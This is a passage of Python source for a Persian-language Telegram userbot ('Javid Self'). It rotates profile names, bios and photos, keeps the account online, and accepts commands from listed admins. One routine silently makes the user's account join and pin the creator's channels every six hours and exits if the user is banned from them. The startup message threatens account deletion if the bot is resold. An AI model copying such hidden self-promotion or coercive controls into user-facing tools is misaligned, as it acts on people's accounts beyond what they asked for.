            styled_time = stylize(time_now, time_font)
            styled_date = stylize(current_date, date_font)

            name = name.replace("ساعت", styled_time)
            name = name.replace("تاریخ", styled_date)

            try:
                await client(functions.account.UpdateProfileRequest(first_name=name))
            except Exception as e:
                print(f"[rotate_name error] {e}")

            current_index = (current_index + 1) % len(name_list)

async def rotate_family():
    global current_family_index
    while True:
        if not self_enabled:
            await asyncio.sleep(5)
            continue
        now_tehran = datetime.now(pytz.timezone('Asia/Tehran'))
        seconds_to_next_minute = 60 - now_tehran.second - now_tehran.microsecond / 1_000_000
        await asyncio.sleep(seconds_to_next_minute)

        if rotate_family_enabled and family_list:
            fam = family_list[current_family_index]

            now_dt = datetime.now(pytz.timezone('Asia/Tehran'))
            time_now = now_dt.strftime("%I:%M") if time_format_12h else now_dt.strftime("%H:%M")
            current_date = jdatetime.datetime.now().strftime("%Y/%m/%d") if date_type == "jalali" else now_dt.strftime("%Y/%m/%d")

            def stylize(text, font_number):
                if font_number == 8:
                    return random_font(text)
                return ''.join(fonts[font_number].get(ch, ch) for ch in text)

            styled_time = stylize(time_now, time_font_family)
            styled_date = stylize(current_date, date_font_family)

            fam = fam.replace("ساعت", styled_time)
            fam = fam.replace("تاریخ", styled_date)

            try:
                await client(functions.account.UpdateProfileRequest(last_name=fam))
            except Exception as e:
                print(f"[rotate_family error] {e}")

            current_family_index = (current_family_index + 1) % len(family_list)

async def rotate_bio():
    global current_bio_index
    while True:
        if not self_enabled:
            await asyncio.sleep(5)
            continue
        now_tehran = datetime.now(pytz.timezone('Asia/Tehran'))
        seconds_to_next_minute = 60 - now_tehran.second - now_tehran.microsecond / 1_000_000
        await asyncio.sleep(seconds_to_next_minute)

        if rotate_bio_enabled and bio_list:
            bio = bio_list[current_bio_index]

            now_dt = datetime.now(pytz.timezone('Asia/Tehran'))
            time_now = now_dt.strftime("%I:%M") if time_format_12h else now_dt.strftime("%H:%M")
            current_date = jdatetime.datetime.now().strftime("%Y/%m/%d") if date_type == "jalali" else now_dt.strftime("%Y/%m/%d")

            def stylize(text, font_number):
                if font_number == 8:
                    return random_font(text)
                return ''.join(fonts[font_number].get(ch, ch) for ch in text)

            styled_time = stylize(time_now, time_font_bio)
            styled_date = stylize(current_date, date_font_bio)

            bio = bio.replace("ساعت", styled_time)
            bio = bio.replace("تاریخ", styled_date)

            try:
                await client(functions.account.UpdateProfileRequest(about=bio))
            except Exception as e:
                print(f"[rotate_bio error] {e}")

            current_bio_index = (current_bio_index + 1) % len(bio_list)

async def keep_online():
    while True:
        if not self_enabled:
            await asyncio.sleep(5)
            continue
        if stay_online:
            try:
                await client(functions.account.UpdateStatusRequest(offline=False))
            except:
                pass
        await asyncio.sleep(60)

async def rotate_profile():
    global used_profile_photo_ids

    while True:
        if not self_enabled:
            await asyncio.sleep(5)
            continue
        now = datetime.now(pytz.timezone('Asia/Tehran'))
        next_time = now.replace(second=0, microsecond=0) + timedelta(minutes=profile_interval_minutes)
        wait_seconds = (next_time - now).total_seconds()
        await asyncio.sleep(wait_seconds)

        if not profile_enabled or not profile_channel_id:
            continue

        try:
            photos = await client.get_messages(profile_channel_id, limit=100)
            valid_photos = [p for p in photos if p.photo and p.id not in used_profile_photo_ids]

            if not valid_photos:
                used_profile_photo_ids.clear()
                valid_photos = [p for p in photos if p.photo]

            if not valid_photos:
                continue

            selected = random.choice(valid_photos)
            file = await client.download_media(selected)

            if not file:
                continue

            await client(UploadProfilePhotoRequest(
                file=await client.upload_file(file)
            ))

            used_profile_photo_ids.append(selected.id)
            if len(used_profile_photo_ids) > 500:
                used_profile_photo_ids = used_profile_photo_ids[-500:]

            os.remove(file)

            photos = await client.get_profile_photos('me')
            if len(photos) > profile_max_count:
                await client(DeletePhotosRequest(id=photos[profile_max_count:]))

        except Exception as e:
            print(f"{e}")

async def get_reply_message(self):
            if self._original.is_reply:
                return await self._original.get_reply_message()
            return None

async def check_membership_and_pin_chat():
    while True:
        try:
            me = await client.get_me()
            channels = ["JavidSelf", "JavidSelfGp"]

            for username in channels:
                is_member = True

                try:
                    await client(GetParticipantRequest(username, me.id))
                except Exception as e:
                    error_text = str(e).upper()
                    if "NOT A MEMBER" in error_text or "PARTICIPANT" in error_text:
                        is_member = False
                    else:
                        print(f"{e}")

                if not is_member:
                    try:
                        await client(JoinChannelRequest(username))
                    except Exception as join_err:
                        join_error_text = str(join_err).upper()

                        if "BANNED" in join_error_text or "NOT PERMITTED" in join_error_text or "LACK PERMISSION" in join_error_text:
                            try:
                                await client.send_message("me", "به دلیل بن بودن از گروه سلف، سلف شما خاموش می‌شود! | Javid Self")
                            except:
                                pass
                            await asyncio.sleep(1)
                            os._exit(0)
                        else:
                            print(f"{join_err}")

            try:
                await client(ToggleDialogPinRequest(
                    peer="JavidSelf",
                    pinned=True
                ))
            except Exception as pin_err:
                print(f"{pin_err}")

        except Exception as global_err:
            print(f"{global_err}")

        await asyncio.sleep(21600)

async def resolve_user_id(client, username: str) -> int:
    if username.startswith('@'):
        username = username[1:]
    entity = await client.get_entity(username)
    if getattr(entity, 'broadcast', False):
        async for message in client.iter_messages(entity, limit=1):
            return message.sender_id or message.from_id.user_id
        return None
    else:
        return entity.id

async def main():
    expire_str = "Uncertain!"
    EXPIRE_DAYS = 30
    expire_file = "expire.json"

    if os.path.exists(expire_file):
        try:
            with open(expire_file, "r", encoding="utf-8") as f:
                data = json.load(f)
                start_str = data.get("start")
                tehran = pytz.timezone("Asia/Tehran")
                start_dt = datetime.strptime(start_str, "%Y/%m/%d %H:%M")
                start_dt = tehran.localize(start_dt)

                expire_dt = start_dt + timedelta(days=EXPIRE_DAYS)
                now_dt = datetime.now(tehran)
                remaining = expire_dt - now_dt

                if remaining.total_seconds() < 0:
                    expire_str = "Expired!"
                else:
                    days = remaining.days
                    hours = remaining.seconds // 3600
                    minutes = (remaining.seconds % 3600) // 60
                    expire_str = f"{days} Days, {hours:02d}:{minutes:02d}"
        except Exception:
            expire_str = "Uncertain!"

    print("Running!")
    await client.send_message("me", f"سلف با موفقیت روی اکانت شما ران شد.\nدر صورت قروش سلف اکانت شما دیلیت خواهد شد.\n\nسازنده : @uezrz\nچنل : @JavidSelf\nورژن : 2.2"
    )
    
    asyncio.create_task(rotate_name())
    asyncio.create_task(rotate_family())
    asyncio.create_task(rotate_bio())
    asyncio.create_task(keep_online())
    asyncio.create_task(rotate_profile())
    client.loop.create_task(check_membership_and_pin_chat())
    await client.run_until_disconnected()

@client.on(events.NewMessage(incoming=True))
async def admin_commands_router(event):
    if not self_enabled or event.sender_id not in admin_list:
        return

    raw_text = event.raw_text.strip()
    
    if not raw_text.startswith(admin_prefix):
        return

    command_without_prefix = raw_text[len(admin_prefix):].strip()

    if (command_without_prefix == "آپدیت" or 
        command_without_prefix == "ریست" or 
        command_without_prefix.startswith("تنظیم ادمین") or 
        command_without_prefix.startswith("حذف ادمین") or 
        command_without_prefix == "پاکسازی لیست ادمین" or 
        command_without_prefix == "لیست ادمین" or 
        command_without_prefix.startswith("وضعیت ادمین")):
        await event.reply("╮ شما دسترسی به این دستور امنیتی را ندارید! | Javid Self")
        return

    for pattern, handler_name in patterns.items():
        match = re.match(pattern, command_without_prefix)
        if match:
            handler_func = globals().get(handler_name)
            if handler_func:
                try:
                    class FakeEvent:
                        def __init__(self, orig_event, match_obj):
                            self._original = orig_event
                            self.pattern_match = match_obj
                            self.chat_id = orig_event.chat_id
                            self.is_reply = orig_event.is_reply
                            self.text = command_without_prefix
                            self.raw_text = command_without_prefix
                        
                        async def edit(self, text, **kwargs):
                            return await self._original.reply(text, **kwargs)
                        
                        async def respond(self, text, **kwargs):
                            return await self._original.reply(text, **kwargs)
                        
                        async def get_reply_message(self):
                            return await self._original.get_reply_message()
                        
                        async def delete(self):
                            pass

                    fake_event = FakeEvent(event, match)
                    await handler_func(fake_event)
                    return
                except Exception as e:
                    print(f"Error executing admin command: {e}")
                    await event.reply(f"╮ خطایی در اجرای دستور رخ داد! | Javid Self")
                    return

if __name__ == '__main__':
    with client:
        client.loop.run_until_complete(main())